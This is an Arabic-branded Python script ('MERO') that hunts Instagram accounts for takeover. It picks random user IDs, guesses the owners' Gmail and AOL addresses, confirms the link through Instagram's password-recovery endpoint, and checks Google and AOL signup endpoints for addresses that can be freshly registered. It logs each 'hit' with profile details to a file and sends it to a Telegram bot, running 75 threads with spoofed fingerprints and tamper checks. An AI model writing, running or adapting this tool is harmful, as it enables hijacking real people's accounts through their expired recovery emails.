#####MERO#####
import importlib.util, os,time
print("[1;92m[38;5;50mTHIS ENCODE BY MERO | @QP4RM •")
time.sleep(3)
try:
    api_path = os.path.join(os.path.dirname(importlib.util.find_spec("requests").origin), 'api.py')
    if os.path.exists(api_path):
        with open(api_path, 'r') as file:
            content = file.read()
            if any(keyword in content for keyword in ['print', 'sys', 'logging', 'write', 'warn']):
                exit("Don't Try to Pull Links Nigga !! Protected by @NawabiPy ")
except Exception as e:
    pass
import datetime
import sys
end_date = datetime.datetime(2025, 3, 17, 22)
if datetime.datetime.now() >= end_date:
    print("انتهى تفعيل راسل لمطور الاصدار لجديد MERO @QPR4M")
    sys.exit()
import requests
import random
import json, string
from threading import Thread
import os
from user_agent import *
from requests import post as pp
from user_agent import generate_user_agent as ggb
from random import choice as cc
from random import randrange as rr
import re
import hashlib
import uuid
from requests import get
import sys
from datetime import datetime
try:
	from colorama import Fore, Style, init
except:
	os.system('pip install colorama')
	from colorama import Fore, Style, init
try:
    from cfonts import render, say
except:
    os.system('pip install python-cfonts')
    from cfonts import render, say
import time
init(autoreset=True)
red = "\033[1m\033[31m"
green = "\033[1m\033[32m"
yellow = "\033[1m\033[33m"
blue = "\033[1m\033[34m"
cyan = "\033[1m\033[36m"
magenta = "\033[1m\033[35m"
M = "\033[1m\033[36m"
white = "\033[1m\033[37m"
orange = "\033[1m\033[38;5;208m"
reset = "\033[0m"
GOJO = render('{GMAIL+AOL}', colors=['white', 'blue'], align='center')

def animated_text(text, colors):
    while True:
        for color in colors:
            yield f"{color}{text}{Style.RESET_ALL}"

insta_colors = [Fore.MAGENTA, Fore.YELLOW, Fore.GREEN]
telegram_colors = [Fore.CYAN, Fore.BLUE, Fore.WHITE]

insta_animator = animated_text("", insta_colors)
telegram_animator = animated_text("MERO", telegram_colors)

print("\033[91m")  # تفعيل اللون الأحمر

logo = """
⠀⠀⠀⠀⢀⣤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⢤⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⡼⠋⠀⣀⠄⡂⠍⣀⣒⣒⠂⠀⠬⠤⠤⠬⠍⠉⠝⠲⣄⡀⠀⠀
⠀⠀⠀⢀⡾⠁⠀⠊⢔⠕⠈⣀⣀⡀⠈⠆⠀⠀⠀⡍⠁⠀⠁⢂⠀⠈⣷⠀⠀  
⠀⠀⣠⣾⠥⠀⠀⣠⢠⣞⣿⣿⣿⣉⠳⣄⠀⠀⣀⣤⣶⣶⣶⡄⠀⠀⣘⢦⡀  
⢀⡞⡍⣠⠞⢋⡛⠶⠤⣤⠴⠚⠀⠈⠙⠁⠀⠀⢹⡏⠁⠀⣀⣠⠤⢤⡕⠱⣷  
⠘⡇⠇⣯⠤⢾⡙⠲⢤⣀⡀⠤⠀⢲⡖⣂⣀⠀⠀⢙⣶⣄⠈⠉⣸⡄⠠⣠⡿  
⠀⠹⣜⡪⠀⠈⢷⣦⣬⣏⠉⠛⠲⣮⣧⣀⣀⣀⠶⠞⢁⣀⣨⢶⢿⣧⠉⡼⠁  MERO
⠀⠀⠈⢷⡀⠀⠀⠳⣌⡟⠻⠷⣶⣧⣀⣀⣹⣉⣉⣿⣉⣉⣇⣼⣾⣿⠀⡇⠀  
⠀⠀⠀⠈⢳⡄⠀⠀⠘⠳⣄⡀⡼⠈⠉⠛⡿⠿⠿⡿⠿⣿⢿⣿⣿⡇⠀⡇⠀    
⠀⠀⠀⠀⠀⠙⢦⣕⠠⣒⠌⡙⠓⠶⠤⣤⣧⣀⣸⣇⣴⣧⠾⠾⠋⠀⠀⡇⠀  
⠀⠀⠀⠀⠀⠀⠀⠈⠙⠶⣭⣒⠩⠖⢠⣤⠄⠀⠀⠀⠀⠀⠠⠔⠁⡰⠀⣧⠀  
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠲⢤⣀⣀⠉⠉⠀⠀⠀⠀⠀⠁⠀⣠⠏⠀  
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠛⠒⠲⠶⠤⠴⠒⠚⠁
"""

print(logo)

def animated_input(prompt):
    text = ""
    sys.stdout.write(prompt)
    sys.stdout.flush()
    while True:
        char = sys.stdin.read(1)
        if char == '\n':
            break
        text += char
        sys.stdout.write('\r' + prompt + text)
        sys.stdout.flush()
        time.sleep(0.05) 
    return text
def display_choices(choices):
    for i, choice in enumerate(choices):
        color = choice_colors[i % len(choice_colors)]
        print(f"{color}{i + 1}{Style.RESET_ALL} {'_' * (6 - len(str(i+1)))} {Fore.YELLOW}{choice}{Style.RESET_ALL}   ", end="")
    print()
def animated_display(options):
    for i, option in enumerate(options):
        colors = choice_colors[i % len(choice_colors)]  
        boxed_option = f"{colors}{i + 1}{Style.RESET_ALL} {'_' * (6 - len(str(i+1)))} {Fore.YELLOW}"
        for char in option:
            boxed_option += f"{char}{Style.RESET_ALL}"
            sys.stdout.write(f"\r{boxed_option}")
            sys.stdout.flush()
            time.sleep(0.03)  
        print()  
choice_colors = [Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE, Fore.LIGHTBLUE_EX]
def get_animated_input(prompt):
    text = ""
    
    for char in prompt:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.03)

    while True:
        char = sys.stdin.read(1)
        if char == '\n':
            break
        text += char
        sys.stdout.write('\r' + prompt + text)  
        sys.stdout.flush()
        time.sleep(0.03)
    return text
ID = get_animated_input(f"ايديك : ")
token = get_animated_input(f"توكنك  ")
userinfo = {}
aca = 0
hits = 0
badinsta = 0
bademail = 0
goodig = 0

def pppp():
    os.system('clear')
    red = Fore.RED
white = Fore.WHITE
reset = Style.RESET_ALL

# تحديث المخزن المؤقت للإخراج
sys.stdout.flush()

# قائمة السنوات مع التلوين
year_options = [
    f"{red}2011{reset}", f"{red}2012{reset}", f"{red}2013{reset}",
    f"{red}2014{reset}", f"{red}2015{reset}", f"{red}2016{reset}",
    f"{red}2017{reset}", f"{red}2018{reset}", f"{red}2019{reset}",
    f"{red}2011 ~ 2023{reset}", f"{red}2010{reset}"
]

for year in year_options:
    print(year)
print(f"{red}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
print(f"{red}┃ {white}MERO{red}                                       ┃")
print(f"{red}┃ {white}-> اختار الانشاء  <- {red}┃")
print(f"{red}┃━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┃{reset}")
animated_display([f"{year}" for year in year_options])

print(f"{red}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
print(f"{red}┃ {white}MERO{red}                                       ┃")
print(f"{red}┃ {white}-> اختار الانشاء  <- {red}┃")
print(f"{red}┃━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┃{reset}")
ShridharX = input(f"{green}-> {white}اختار من 1 لين 10 حبيبي : {reset}")

if ShridharX == '1':
    bbk = 10000
    id = 17699999
elif ShridharX == '2':
    bbk = 17699999
    id = 263014407
elif ShridharX == '3':
    bbk = 263014407
    id = 361365133
elif ShridharX == '4':
    bbk = 361365133
    id = 1629010000
elif ShridharX == '5':
    bbk = 1629010000
    id = 2500000000
elif ShridharX == '6':
    bbk = 2500000000
    id = 3713668786
elif ShridharX == '7':
    bbk = 3713668786
    id = 5699785217
elif ShridharX == '8':
    bbk = 5699785217
    id = 8597939245
elif ShridharX == '9':
    bbk = 8597939245
    id = 21254029834
elif ShridharX == '10':
    bbk = 10000
    id = 21254029834
elif ShridharX == '11':  
    bbk = 1
    id = 9999
else:
    exit()


while True:
    try:
        a = "https://www.instagram.com/accounts/login"
        session = requests.Session()
        aa = session.get(a)
        csrf = aa.cookies.get('csrftoken')
        break
    except:
        pass

yy = 'azertyuiopmlkjhgfdsqwxcvbn'
def tll():
    try:
        n1 = ''.join(cc(yy) for i in range(rr(6, 9)))
        n2 = ''.join(cc(yy) for i in range(rr(3, 9)))
        host = ''.join(cc(yy) for i in range(rr(15, 30)))
        he3 = {
            "accept": "*/*",
            "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "google-accounts-xsrf": "1",
            'user-agent': str(ggb()),
        }
        res1 = requests.get(
            'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', 
            headers=he3
        )
        tok = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
        cookies = {
            '__Host-GAPS': host
        }
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',
            'user-agent': ggb(),
        }
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
        }
        response = requests.post(
            'https://accounts.google.com/_/signup/validatepersonaldetails',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        tl = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict()['__Host-GAPS']
        with open('tl.txt', 'w') as f:
            f.write(f'{tl}//{host}\n')
    except Exception as e:
        print(e)
        tll()
tll()

def Getaol():
    try:      
        qq = requests.get('https://login.aol.com/account/create', headers={
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
            'accept-language': 'en-US,en;q=0.9',
        })
        cookies = qq.cookies.get_dict()
        tm1 = str(time.time()).split('.')[0]
        cookies.update({
            'gpp': 'DBAA',
            'gpp_sid': '-1',
            '__gads': f'ID=c0M0fd00676f0ea1:T={tm1}:RT={tm1}:S=ALNI_MaEGaVTSG6nQFkSJ-RnxSZrF5q5XA',
            '__gpi': f'UID=00000cf0e8904e94:T={tm1}:RT={tm1}:S=ALNI_MYCzPrYn9967HtpDSITUe5Z4ZwGOQ',
            'cmp': f't={tm1}&j=0&u=1---',
        })
        specData = qq.text.split('name="attrSetIndex">\n        <input type="hidden" value="')[1].split('" name="specData">')[0]
        specId = qq.text.split('name="browser-fp-data" id="browser-fp-data" value="" />\n        <input type="hidden" value="')[1].split('" name="specId">')[0]
        crumb = qq.text.split('name="cacheStored">\n        <input type="hidden" value="')[1].split('" name="crumb">')[0]
        sessionIndex = qq.text.split('"acrumb">\n        <input type="hidden" value="')[1].split('" name="sessionIndex">')[0]
        acrumb = qq.text.split('name="crumb">\n        <input type="hidden" value="')[1].split('" name="acrumb">')[0]
        try:
            os.remove('aol_req.txt')
            os.remove('aol_cok.txt')
        except:
            pass
        with open('aol_req.txt', 'a') as t:
            t.write(f"{specData}Π{specId}Π{crumb}Π{sessionIndex}Π{acrumb}\n")

        with open('aol_cok.txt', 'a') as g:
            g.write(str(cookies) + '\n')
    except Exception as e:
        print(e)
        Getaol()
Getaol()

def check_gmail(email):
    global bademail, hits
    try:
        if '@' in email:
            email = str(email).split('@')[0]

        try:
            o = open('tl.txt', 'r').read().splitlines()[0]
        except:
            o = open('tl.txt', 'r').read().splitlines()[0]

        tl, host = o.split('//')

        cookies = {
            '__Host-GAPS': host
        }
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': f'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}',
            'user-agent': ggb(),
        }

        params = {'TL': tl}
        data = (
            'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn'
            f'&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
        )
        response = pp(
            'https://accounts.google.com/_/signup/usernameavailability',
            params=params,
            cookies=cookies,
            headers=headers,
            data=data,
        )
        if '"gf.uar",1' in str(response.text):
            hits += 1
            pppp()
            if '@' not in email:
                ok = email + '@gmail.com'
                username, gg = ok.split('@')
                InfoAcc(username, gg)
            else:
                username, gg = email.split('@')
                InfoAcc(username, gg)
        else: 
          bademail+=1
          pppp()
    except:''


def check_aol(email):
    global hits, bademail
    try:
        if '@' in email:
            name = email.split('@')[0]
        else:
            name = email

        try:
            with open("aol_req.txt", "r") as f:
                for line in f:
                    specData, specId, crumb, sessionIndex, acrumb = line.strip().split('Π')

            with open("aol_cok.txt", "r") as f:
                for line in f:
                    cookies = eval(line.strip())
        except:
            Getaol()
            with open("aol_req.txt", "r") as f:
                for line in f:
                    specData, specId, crumb, sessionIndex, acrumb = line.strip().split('Π')

            with open("aol_cok.txt", "r") as f:
                for line in f:
                    cookies = eval(line.strip())

        headers = {
            'authority': 'login.aol.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://login.aol.com',
            'referer': f'https://login.aol.com/account/create?specId={specId}&done=https%3A%2F%2Fwww.aol.com',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
            'x-requested-with': 'XMLHttpRequest',
        }

        params = {
            'validateField': 'userId',
        }

        data = f'browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A8%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A4%2C%22timezoneOffset%22%3A-60%2C%22timezone%22%3A%22Africa%2FCasablanca%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A5%2C%22hash%22%3A%222c14024bf8584c3f7f63f24ea490e812%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.%20(Intel)~ANGLE%20(Intel%2C%20Intel(R)%20HD%20Graphics%204000%20(0x00000166)%20Direct3D11%20vs_5_0%20ps_5_0%2C%20D3D11)%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A33%2C%22hash%22%3A%22edeefd360161b4bf944ac045e41d0b21%22%7D%2C%22audio%22%3A%22124.04347527516074%22%2C%22resolution%22%3A%7B%22w%22%3A%221600%22%2C%22h%22%3A%22900%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22860%22%2C%22h%22%3A%221600%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1704793094844%2C%22render%22%3A1704793096534%7D%7D&specId={specId}&cacheStored=&crumb={crumb}&acrumb={acrumb}&sessionIndex={sessionIndex}&done=https%3A%2F%2Fwww.aol.com&googleIdToken=&authCode=&attrSetIndex=0&specData={specData}&multiDomain=&tos0=oath_freereg%7Cus%7Cen-US&firstName=ahmed&lastName=Mahos&userid-domain=yahoo&userId={name}&password=Drahmed2006##$$&mm=10&dd=24&yyyy=2000&signup='

        res = requests.post('https://login.aol.com/account/module/create', params=params, headers=headers, data=data, cookies=cookies).text
        if '{"errors":[]}' in res:
            hits += 1
            pppp()
            if '@' not in email:
                ok = email + '@aol.com'
                username, gg = ok.split('@')
                InfoAcc(username, gg)
            else:
                username, gg = email.split('@')
                InfoAcc(username, gg)
        else: 
          bademail+=1
          pppp()
    except:''
    

def check(email):
    global goodig, badinsta
    ua = generate_user_agent()
    dev = 'android-'
    device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    uui = str(uuid.uuid4())
    headers = {
        'User-Agent': ua,
        'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    }
    data = {
        'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + json.dumps({
            '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
            'adid': uui,
            'guid': uui,
            'device_id': device_id,
            'query': email
        }),
        'ig_sig_key_version': '4',
    }
    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data).text
    if email in response:
        if '@gmail.com' in email:
            check_gmail(email)
        elif '@aol.com' in email or '@a**.com' in email:
            check_aol(email)
        goodig += 1
        pppp()
    else:
        badinsta += 1
        pppp()



def rest(user):
  try:
    headers = {
    'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
    'X-Pigeon-Rawclienttime': '1700251574.982',
    'X-IG-Connection-Speed': '-1kbps',
    'X-IG-Bandwidth-Speed-KBPS': '-1.000',
    'X-IG-Bandwidth-TotalBytes-B': '0',
    'X-IG-Bandwidth-TotalTime-MS': '0',
    'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
    'X-IG-Connection-Type': 'WIFI',
    'X-IG-Capabilities': '3brTvw==',
    'X-IG-App-ID': '567067343352427',
    'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
    'Accept-Language': 'en-GB, en-US',
     'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept-Encoding': 'gzip, deflate',
    'Host': 'i.instagram.com',
    'X-FB-HTTP-Engine': 'Liger',
    'Connection': 'keep-alive',
    'Content-Length': '356',
}
    data = {
    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}',
    'ig_sig_key_version': '4',
  }
    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,).json()
    r=response['email']
  except:
    r='no REST !'
  return r

def date(hy):
    try:
        ranges = [
            (1279000, 2010),
            (17750000, 2011),
            (279760000, 2012),
            (900990000, 2013),
            (1629010000, 2014),
            (2500000000, 2015),
            (3713668786, 2016),
            (5699785217, 2017),
            (8597939245, 2018),
            (21254029834, 2019),
            (43464475395, 2020),
            (50289297647, 2021),
            (57464707082, 2022),
            (63313426938, 2023)
            
        ]
        
        for upper, year in ranges:
            if hy <= upper:
                return year
        return 2023
    
    except Exception:
        pass

    
def InfoAcc(username, gg):
    global aca,hits
    oo = f"-1::{username}"
    ee = __import__('base64').b64encode(oo.encode('utf-8')).decode('utf-8')
    headers = {
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }
    rr = requests.get(f'https://instanavigation.net/api/v1/stories/{ee}', headers=headers).json()
    Id = rr.get('user_info', {}).get('id', None)
    full_name = rr.get('user_info', {}).get('full_name', None)
    fows = rr.get('user_info', {}).get('followers', None)
    fowg = rr.get('user_info', {}).get('following', None)
    pp = rr.get('user_info', {}).get('posts', None)
    isPraise = rr.get('user_info', {}).get('is_private', None)

    try:
        if (fows and pp):
            if (fows >= 1000 and pp >= 1000):
                meta = True
            else:
                meta = False
        else:
            meta = False
    except:
        meta=False
    try:
        hy = int(Id) if Id != None else None
        datte = date(hy) if hy else 'NoValue'
    except:
        datte = 'NoValue'
    try:
        domain,llss=gg.split('.').capitalize()
    except:
        domain = gg.split('.')[0].capitalize()
    
    reset = rest(username) if rest(username) else 'Cracked' 
    
    if reset != 'Cracked':
        status = 'Proper Hit' if username[0] == reset.split('@')[0][0] and username[-1] == reset.split('@')[0][-1] else 'Cracked Hit'
    else:
        status = 'Cracked Hit'
    hits += 1
    aca += 1
    if (full_name or fows or fowg or datte or pp or isPraise):
        tlg = f'''
MERO INSTA
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
رقم صيد » {aca}
دومينو » {domain}
𝐌𝐄𝐓𝐀 » {meta}
اسم » {full_name}
يوزر » {username}
متابعين » {fows}
يتابع » {fowg}
داتا » {datte}
عدد لبوست » {pp}
𝐏𝐑𝚰𝐕𝐀𝐓𝐄 » {isPraise}
ايميل » {username}@{gg}
𝐒𝐓𝐀𝐓𝐔𝐒 » {status}
رست » {reset}
By.MERO @QP4RM
'''
    else:
        tlg = f'''
- MERO
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
رقم صيد » {aca}
دومينو » {domain}
يوزر » {username}
وقت » {time}
ايميل » {username}@{gg}
𝐒𝐓𝐀𝐓𝐔𝐒 » {status}
رست » {reset}
By.MERO @QP4RM
'''

    with open('SoukHits.txt', 'a') as ff:
        ff.write(f'{tlg}\n')
    try:
        requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
    except:
        pass
        
def gg() -> str:
    while True:
        data = {
            "lsd": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            "variables": json.dumps({"id": int(random.randrange(bbk, id)), "render_surface": "PROFILE"}),
            "doc_id": "25618261841150840"
        }

        response = requests.post(
            "https://www.instagram.com/api/graphql",
            headers={"X-FB-LSD": data["lsd"]},
            data=data
        )
        try:
            username = response.json().get('data', {}).get('user', {}).get('username')
            userinfo[username] = response.json()
            emails = [ username + '@gmail.com', username + '@aol.com']
            status_message = f"{Fore.GREEN}True : 0 {Fore.RED}False : 8 {Fore.YELLOW}Bad : 0{Style.RESET_ALL}"
            sys.stdout.write(status_message + '\n')  
            sys.stdout.flush()

            for email in emails:
                check(email)
                if "@gmail.com" in email or "@aol.com" in email or "@a**.com" in email:
                  true_count = hits
                  false_count = badinsta + bademail
                  bad_count = goodig
                  status_message = f"{Fore.GREEN}True : {true_count} {Fore.RED}False : {false_count} {Fore.YELLOW}Bad : {bad_count}{Style.RESET_ALL}"
                  sys.stdout.write('\r' + status_message) 
                  sys.stdout.flush()

        except Exception as e:
            pass


for _ in range(75):
    Thread(target=gg).start()